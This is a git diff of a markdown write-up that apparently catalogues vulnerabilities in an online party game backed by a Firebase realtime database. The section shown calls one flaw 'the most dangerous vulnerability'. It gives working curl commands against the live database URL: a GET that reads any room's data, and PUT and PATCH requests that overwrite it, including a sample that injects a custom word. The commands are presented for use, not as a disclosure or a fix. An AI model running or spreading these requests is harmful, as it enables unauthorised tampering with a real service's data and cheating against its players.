@@ -26,12 +26,21 @@ https://gamenight-34130-default-rtdb.firebaseio.com/larpit/[ROOMCODE].json
 
 ### MASTER_OOGWAY'S_SCRIBE
 
-This, in my opinion is the most dangerous vulnerability out of all of them. However, it wont work on chromebooks. This vuln allows the attacker(Not larper) to modify the actual database of anygame/file. How it works: 
+This, in my opinion is the most dangerous vulnerability out of all of them. This vuln allows the attacker(Not larper) to modify the actual database of anygame/file. 
+
+
+
+
+
+
+#### How it works: 
      
 To read:
+     
 `curl 'https://gamenight-34130-default-rtdb.firebaseio.com/larpit/ROOM_CODE.json' | jq`    
 
 To write: 
+     
 `curl -i -X PUT \
   'https://gamenight-34130-default-rtdb.firebaseio.com/larpit/[ROOMCODE_OR_CUSTOM_DB].json' \
   -H 'Content-Type: application/json' \
@@ -39,7 +48,9 @@ To write:
 
 
       
-OR(change the word to something custom example): `curl -i -X PATCH \
+OR(change the word to something custom example): 
+     
+    `curl -i -X PATCH \
   'https://gamenight-34130-default-rtdb.firebaseio.com/larpit/[ROOMCODE].json' \
   -H 'Content-Type: application/json' \
   --data '{"word":"ImDaBest"}'`
